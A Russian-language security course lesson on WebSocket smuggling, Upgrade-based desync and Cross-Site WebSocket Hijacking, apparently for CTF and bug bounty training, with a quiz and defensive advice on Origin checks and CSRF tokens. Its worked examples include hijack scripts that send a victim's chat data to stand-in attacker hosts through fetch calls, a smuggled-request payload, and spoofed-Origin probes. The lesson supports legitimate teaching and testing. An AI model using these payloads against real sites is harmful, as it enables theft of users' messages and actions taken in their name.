---
id: web-websocket-smuggling
title: "WebSocket smuggling и туннелирование"
category: web
parent: web-websocket
difficulty: hard
order: 1
tags: [websocket, smuggling, upgrade, desync, tunnelling, http]
prerequisites: [web-websocket, web-request-smuggling-advanced]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 42
summary: "Как использовать WebSocket-апгрейд для рассинхронизации HTTP-соединения, туннелирования и обхода прокси."
---

WebSocket начинается с HTTP-запроса `Upgrade: websocket`. Этот **апгрейд** — точка рассинхронизации: если фронтенд/прокси и бэкенд по-разному обрабатывают `Upgrade`/`Connection`, можно протащить данные мимо фильтров, «сломать» границу запроса или установить туннель. WebSocket smuggling — часть семейства desync-атак, но со своей спецификой. Этот урок — про апгрейд-механику и эксплуатацию.

## Теория: рукопожатие WebSocket

Клиент:

```
GET /chat HTTP/1.1
Host: target.local
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Сервер:

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

После `101` соединение переходит в **бинарный фреймовый режим** — это уже не HTTP. Ошибка обработки апгрейда ведёт к тому, что часть данных интерпретируется не тем парсером.

## Теория: где ломается

- **Прокси не понимает `Upgrade`** и «проглатывает» его как обычный запрос, но бэкенд переключается в WS-режим → рассинхронизация.
- **`Connection: Upgrade` + smuggling.** Известный трюк: заголовок `Upgrade` может «отравить» соединение так, что последующий HTTP-запрос будет интерпретирован как WS-кадр или наоборот.
- **CL.0 + Upgrade.** Если бэкенд не читает тело при апгрейде, остаток «прилипает».
- **Туннелирование.** Через WS можно протаскивать произвольные данные мимо WAF/прокси, которые не инспектируют бинарные кадры (см. `web-waf-bypass`).

## Теория: WebSocket smuggling

Основная идея: заставить фронтенд/прокси считать, что запрос — обычный HTTP, а бэкенд — что это апгрейд (или наоборот). Тогда:

1. Фронтенд пересылает «хвост» как следующий HTTP-запрос, а бэкенд читает его как WS-данные (или наоборот).
2. Возникает request smuggling через границу апгрейда.

Также известен вектор, где **`Sec-WebSocket-Protocol`** или заголовки апгрейда используются для инъекции, а **некорректная проверка Origin** у WS-сервера открывает **Cross-Site WebSocket Hijacking (CSWSH)**.

## Теория: CSWSH (Cross-Site WebSocket Hijacking)

Если WS-сервер аутентифицирует только по cookie и **не проверяет `Origin`**, атакующий на `evil.com` открывает WS к `target.local` в контексте жертвы:

```js
const ws = new WebSocket('wss://target.local/chat');
ws.onmessage = (e) => fetch('https://attacker/?d=' + encodeURIComponent(e.data));
ws.onopen = () => ws.send(JSON.stringify({action:'getHistory'}));
```

Cookie жертвы уходят автоматически → чтение/отправка сообщений от её имени. Это родственно CSRF, но для WS.

## Инструменты и команды

Проверить рукопожатие и Origin-проверку:

```bash
curl -s -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13' \
  -H 'Origin: https://evil.com' https://target.local/chat | head -20
```

Смотрим: `101 Switching Protocols` при чужом `Origin` → нет проверки Origin (CSWSH).

Для smuggling-проб — Burp + **WebSocket Turbo Intruder** / ручные сырые запросы через `openssl s_client`. Тестируйте изолированно (риск задеть других).

## Разобранный пример: CSWSH

Шаг 1. Проверяем, принимает ли WS-сервер чужой Origin (команда выше). Если `101` — уязвимо.

Шаг 2. На `evil.com`:

```html
<script>
const ws = new WebSocket('wss://target.local/chat');
ws.onmessage = e => fetch('https://attacker.example/?d='+encodeURIComponent(e.data));
ws.onopen = () => ws.send(JSON.stringify({cmd:'history'}));
</script>
```

Шаг 3. Жертва открывает страницу — её история чата утекает. В отчёте: отсутствие Origin-проверки + пейлоад.

## Разобранный пример: smuggling через Upgrade

Шаг 1. Отправляем запрос с `Connection: Upgrade` и `Upgrade: websocket`, но с телом, содержащим «хвост»:

```
POST / HTTP/1.1
Host: target.local
Connection: Upgrade
Upgrade: websocket
Content-Length: 20

GET /admin HTTP/1.1
```

Шаг 2. Если прокси обрабатывает это как обычный запрос (пересылая тело), а бэкенд — как апгрейд, возможна рассинхронизация. Признаки: несоответствие ответа, второй ответ, таймаут.

Шаг 3. В отчёте — точные заголовки/байты и наблюдаемый эффект. **Изолируйте тест** — smuggling может задеть других.

## Частые ошибки

- **Забывать про Origin-проверку.** CSWSH — самая частая WS-дыра.
- **Считать WS «отдельным протоколом».** Рукопожатие — это HTTP и участвует в desync.
- **Игнорировать прокси.** Именно несоответствие прокси/бэкенда даёт smuggling.
- **Травить общий трафик.** WS-smuggling может сломать чужие сессии.
- **Не проверять бинарные кадры.** WAF часто не инспектирует WS-фреймы → туннель.

## CSWSH: полная эксплуатация

Cross-Site WebSocket Hijacking — самый распространённый баг WebSocket. Причина: рукопожатие проверяет только cookie (как обычный запрос), но не `Origin`, и не защищено CSRF-токеном.

```javascript
// страница атакующего: подключаемся к чужому WS от имени жертвы
const ws = new WebSocket('wss://app.example/ws');
ws.onopen = () => ws.send(JSON.stringify({action: 'getMessages'}));
ws.onmessage = (e) => {
  // пересылаем украденные данные
  fetch('https://attacker/steal?d=' + encodeURIComponent(e.data));
};
```

```bash
# проверка, проверяется ли Origin
# 1) легитимное рукопожатие
curl -s -i -N -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  -H 'Origin: https://app.example' https://app.example/ws | head -1
# 2) чужой Origin
curl -s -i -N ... -H 'Origin: https://attacker.example' https://app.example/ws | head -1
# 101 Switching Protocols при чужом Origin -> CSWSH возможен
```

Cookie шлются автоматически (если `SameSite=None` или нет `SameSite`), поэтому жертве достаточно открыть страницу атакующего.

## WebSocket smuggling и Upgrade-аномалии

Smuggling через WebSocket строится на расхождении прокси и бэкенда в обработке `Upgrade`.

```http
GET /ws HTTP/1.1
Host: app.example
Upgrade: websocket
Connection: Upgrade
Content-Length: 0
```

Атаки: отправка «обычного» HTTP-запроса после Upgrade, когда прокси уже переключился; использование `Connection: keep-alive, Upgrade`; рассинхрон `Content-Length` в рукопожатии. Это близко к request smuggling (см. `web-request-smuggling`).

## WebSocket over HTTP/2 (RFC 8441)

Через HTTP/2 WebSocket идёт по `CONNECT` с `:protocol=websocket`. Прокси могут по-разному транслировать это в HTTP/1.1 — источник smuggling.

```text
# HTTP/2 CONNECT с расширенным протоколом
:method: CONNECT
:protocol: websocket
:authority: app.example
```

Проверяйте: сохраняется ли аутентификация при трансляции h2→h1, можно ли обойти проверки Origin через downgrade, как ведёт себя `Sec-WebSocket-*` при переупаковке.

## Таблица заголовков и их роли

| Заголовок | Роль | Риск |
|-----------|------|------|
| `Upgrade: websocket` | запрос на переключение | аномалии smuggling |
| `Connection: Upgrade` | управление соединением | TE/CL-рассинхрон |
| `Sec-WebSocket-Key` | случайный ключ | должен быть уникален |
| `Sec-WebSocket-Accept` | ответный хеш | проверка корректности |
| `Sec-WebSocket-Version` | 13 | отказ при ином |
| `Origin` | защита от CSWSH | **часто не проверяется** |
| `Sec-WebSocket-Protocol` | подпротокол | подмена (graphql-ws и т.п.) |
| `Cookie` | аутентификация | автоматически шлётся |

## Инструменты

```bash
# websocat — подключение и ручное общение
websocat -H='Origin: https://attacker.example' wss://app.example/ws
# отправка сообщения
echo '{"action":"admin"}' | websocat wss://app.example/ws
# Burp: WebSocket history + Repeater (расширение по умолчанию)
# Python-клиент для скриптов
python3 - <<'PY'
import websocket
ws = websocket.create_connection('wss://app.example/ws',
      header=['Origin: https://attacker.example'])
ws.send('{"action":"getFlag"}')
print(ws.recv())
PY
```

```bash
# nuclei — известные проблемы WS
nuclei -u wss://app.example/ws -tags websocket -j
```

## Что делать дальше / решение

1. **Найдите WS-эндпоинт.** DevTools → WS, или `grep` по JS (`new WebSocket`).
2. **Проверьте Origin.** Чужой Origin должен отклоняться.
3. **Проверьте CSRF-защиту.** Есть ли токен в рукопожатии.
4. **Проверьте авторизацию сообщений.** Не только на connect, но на каждое действие.
5. **Проверьте smuggling.** Аномалии Upgrade/CL/TE.
6. **Зафиксируйте PoC.** Страница-эксплойт + перехваченные данные.

## Практика и справочники

- **PortSwigger Academy** — «WebSocket vulnerabilities» (в т.ч. CSWSH).
- **HackTricks** — «WebSockets».
- **websocat** — CLI-клиент.
- **RFC 6455** (WS) и **RFC 8441** (WS over HTTP/2).

## Почему Origin-проверка — единственная защита

WebSocket не подчиняется Same-Origin Policy: браузер разрешает соединение на любой хост, а cookie уходят автоматически. Единственный барьер — проверка `Origin` на сервере (плюс CSRF-токен в рукопожатии). Если её нет:

| Защита | Есть | Нет |
|--------|------|-----|
| Origin-проверка | CSWSH невозможен | CSWSH возможен |
| CSRF-токен в handshake | защищает | не защищает |
| SameSite=Strict | cookie не уйдут | cookie уйдут |
| Авторизация на каждом сообщении | ограничивает ущерб | полный доступ |

## Сводка атак на WebSocket

| Атака | Условие | Эффект |
|-------|---------|--------|
| CSWSH | нет Origin-проверки | действия от имени жертвы |
| Smuggling | расхождение Upgrade/CL | обход прокси |
| Подмена подпротокола | `Sec-WebSocket-Protocol` | обход логики |
| Отсутствие authz на сообщениях | проверка только на connect | доступ к чужим данным |
| Долгие соединения | нет лимитов | DoS/утечка |

## Итог по WebSocket

WebSocket — полноценный канал аутентификации и данных, но часто защищён хуже, чем обычные HTTP-эндпоинты. Проверяйте: Origin на рукопожатии, CSRF-токен, авторизацию **каждого** сообщения, а не только соединения; аномалии Upgrade/Content-Length для smuggling. CSWSH — самая частая и самая опасная находка в этой области.

## Приоритет проверки

Начинайте с CSWSH: это самая частая и самая прямолинейная проблема — достаточно проверить, отклоняет ли сервер чужой `Origin`. Если проверка есть, переходите к авторизации отдельных сообщений и к аномалиям рукопожатия (Upgrade, Content-Length, downgrade из HTTP/2). Отдельно оцените, могут ли долгие соединения использоваться для DoS или медленной утечки данных.

## Ещё одна деталь

Проверяйте не только `wss://`, но и незашифрованный `ws://`: некоторые приложения оставляют его включённым, и тогда данные (включая токены) идут в открытом виде. Комбинация `ws://` с отсутствием Origin-проверки делает CSWSH ещё и сетевым перехватом.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "С чего начинается WebSocket-соединение?"
  options:
    - "С HTTP-запроса `Upgrade: websocket`"
    - "С TLS-рукопожатия"
    - "С DNS-запроса"
    - "С `CONNECT`"
  answer: 0
  explanation: "После `101 Switching Protocols` соединение переходит в фреймовый режим."
- question: "Что такое CSWSH?"
  options:
    - "Cross-Site WebSocket Hijacking — открытие WS жертвы без проверки Origin"
    - "SQL-инъекция"
    - "Отравление DNS"
    - "Отравление кэша"
  answer: 0
  explanation: "Cookie жертвы уходят автоматически, если Origin не проверяется."
- question: "Почему WebSocket участвует в smuggling?"
  options:
    - "Рукопожатие — это HTTP; прокси и бэкенд могут рассинхронизироваться на `Upgrade`"
    - "WS шифрует данные"
    - "WS не использует TCP"
    - "WS заменяет DNS"
  answer: 0
  explanation: "Разная обработка `Upgrade`/`Connection` создаёт desync."
- question: "Почему WAF может не видеть данные в WS?"
  options:
    - "После апгрейда это бинарные кадры, которые WAF не инспектирует"
    - "WAF не читает HTTPS"
    - "WS не проходит через WAF"
    - "WS использует UDP"
  answer: 0
  explanation: "Фреймовый режим вне HTTP-инспекции → туннель."
- question: "Что проверить в рукопожатии для CSWSH?"
  options:
    - "Принимает ли сервер чужой `Origin` (101)"
    - "Есть ли `Content-Length`"
    - "Версию TLS"
    - "Порт"
  answer: 0
  explanation: "`101` при чужом Origin = нет проверки."
```

## Где пригодится

- **CTF (Web):** задачи на WS-хайджек и десинк через апгрейд.
- **Bug bounty:** CSWSH и WS-smuggling — современные классы.
- **Пентест:** аудит WS-серверов, Origin-политик, прокси-цепочек.
- **Работа (AppSec/Dev):** проверка Origin, аутентификация WS не только по cookie, корректный апгрейд.
